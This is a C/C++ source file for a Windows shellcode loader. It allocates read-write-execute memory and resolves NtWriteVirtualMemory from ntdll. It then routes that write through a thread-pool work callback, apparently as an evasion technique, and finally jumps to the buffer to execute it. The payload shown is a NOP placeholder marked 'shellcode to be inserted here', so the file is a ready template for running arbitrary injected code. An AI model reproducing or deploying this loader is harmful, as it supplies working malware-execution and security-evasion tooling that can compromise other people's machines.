#include <windows.h>
#include <stdio.h>

extern "C" VOID CALLBACK SimpleCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;
    HANDLE ProcessHandle;
    LPVOID BaseAddress;
    LPCVOID Buffer;
    SIZE_T NumberOfBytesToWrite;
    SIZE_T* NumberOfBytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, * PNTWRITEVIRTUALMEMORY_ARGS;

int main() {

    unsigned char shellcode[] = { 0x90,0x90,0x90 }; // shellcode to be inserted here
    LPVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = sizeof shellcode;

    allocatedAddress = VirtualAlloc(NULL, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    printf("Allocated address: %p\n", allocatedAddress);

    NTWRITEVIRTUALMEMORY_ARGS ntWtireVirtualMemoryArgs = { 0 };
    ntWtireVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
    ntWtireVirtualMemoryArgs.ProcessHandle = GetCurrentProcess();
    ntWtireVirtualMemoryArgs.BaseAddress = allocatedAddress;
    ntWtireVirtualMemoryArgs.Buffer = shellcode;
    ntWtireVirtualMemoryArgs.NumberOfBytesToWrite = sizeof(shellcode);
    ntWtireVirtualMemoryArgs.NumberOfBytesWritten = NULL;

    PTP_WORK ptpWork = CreateThreadpoolWork(SimpleCallback, &ntWtireVirtualMemoryArgs, NULL);
    SubmitThreadpoolWork(ptpWork);
    Sleep(1000);

    ((void(*)())allocatedAddress)();

    CloseThreadpoolWork(ptpWork);

    return 0;
}
